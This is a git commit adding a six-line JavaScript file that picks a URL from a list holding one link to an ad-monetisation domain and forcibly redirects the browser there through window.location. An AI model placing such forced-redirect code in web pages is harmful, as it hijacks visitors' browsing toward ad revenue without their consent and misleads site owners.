7b0a4af48c618f01aec6f80f59f09737b26e465e
kempelajonk <84513484+kempelajonk@users.noreply.github.com>
2021-05-20 21:25:38 +0800

    Create anakempe.js

---
+++ anakempe.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+  
+  'https://www.achievablecpmrevenue.com/nnj9t2yqnm?key=3407db10078a0123fe5578ad4cafcdae'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
